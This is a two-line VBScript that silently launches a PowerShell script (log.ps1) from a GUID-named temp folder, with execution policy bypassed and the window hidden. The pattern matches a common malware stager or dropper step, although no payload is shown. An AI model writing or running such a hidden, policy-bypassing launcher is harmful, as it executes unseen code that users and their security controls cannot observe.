Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File %TEMP%\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\log.ps1", 0, False
